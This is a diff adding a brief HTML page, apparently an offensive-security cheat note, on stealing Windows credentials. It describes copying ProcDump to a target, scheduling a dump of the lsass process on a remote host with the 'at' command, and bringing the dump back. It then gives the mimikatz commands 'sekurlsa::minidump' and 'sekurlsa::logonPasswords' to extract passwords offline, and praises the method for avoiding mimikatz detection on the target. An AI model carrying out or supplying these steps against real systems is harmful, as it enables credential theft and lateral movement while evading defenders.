@@ -1,0 +1,18 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>ProcDump</title>
+</head><body>Using ProcDump to get a dump of the lsass process. Requires ProcDump to be copied to the target machine.<br/>
+ProcDump.bat just to help facilitate 'one click' execution<br/>
+<br/>
+at \\192.168.1.3 20:55 C:\windows\temp\procdump.bat<br/>
+<br/>
+<br/>
+From there you'll have a dump file, copy it back from the remote host and use mimikatz alpha to retrieve the creds from the dump file. This has the advantage of not worrying about mimikatz detection on the target. <br/>
+<br/>
+from the mimikatz blog post:<br/>
+<br/>
+#Switch to minidump<br/>
+mimikatz # sekurlsa::minidump lsass.dmp<br/>
+mimikatz # sekurlsa::logonPasswords</body></html>
